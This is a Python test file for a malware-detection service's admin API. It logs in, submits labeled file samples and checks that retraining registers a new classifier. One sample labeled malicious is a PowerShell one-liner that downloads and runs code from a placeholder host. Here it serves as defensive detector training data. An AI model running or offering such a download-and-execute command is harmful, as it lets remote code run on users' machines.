def _login_admin(client):
    response = client.post(
        "/api/v1/auth/login",
        json={"email": "admin@example.com", "password": "admin-password-123"},
    )
    assert response.status_code == 200
    token = response.json().get("access_token")
    assert token
    return token


def _admin_headers_with_step_up(client, actions=None):
    token = _login_admin(client)
    step_up = client.post(
        "/api/v1/auth/step-up",
        headers={"Authorization": f"Bearer {token}"},
        json={"password": "admin-password-123", "actions": actions or []},
    )
    assert step_up.status_code == 200, step_up.text
    step_up_token = step_up.json().get("step_up_token")
    assert step_up_token
    return {
        "Authorization": f"Bearer {token}",
        "X-Step-Up-Token": step_up_token,
    }


def test_defender_file_retrain_registers_candidate(client):
    headers = _admin_headers_with_step_up(client, actions=["defender.train.run"])

    fb_1 = client.post(
        "/api/v1/defender/feedback/file",
        json={
            "filename": "powershell-shell.txt",
            "observed_text": "powershell -c iex (new-object net.webclient).downloadstring('http://bad')",
            "true_label": "Malicious",
            "predicted_label": "Safe",
            "source": "human",
        },
        headers=headers,
    )
    assert fb_1.status_code == 200, fb_1.text

    fb_2 = client.post(
        "/api/v1/defender/feedback/file",
        json={
            "filename": "meeting-notes.txt",
            "observed_text": "team notes for sprint planning and release checklist",
            "true_label": "Safe",
            "predicted_label": "Suspicious",
            "source": "human",
        },
        headers=headers,
    )
    assert fb_2.status_code == 200, fb_2.text

    train = client.post(
        "/api/v1/defender/train",
        json={
            "domain": "file",
            "min_feedback_samples": 2,
            "promote_if_better": False,
            "notes": "test-file-retrain",
        },
        headers=headers,
    )
    assert train.status_code == 200, train.text
    payload = train.json()
    assert payload.get("status") == "ok"
    results = payload.get("results") or []
    assert len(results) >= 1
    file_result = results[0]
    assert file_result.get("domain") == "file"
    assert file_result.get("status") == "trained"
    assert file_result.get("details", {}).get("registry_id")

    models = client.get("/api/v1/defender/models?domain=file&limit=5", headers=headers)
    assert models.status_code == 200, models.text
    models_payload = models.json()
    assert isinstance(models_payload, list)
    assert len(models_payload) >= 1
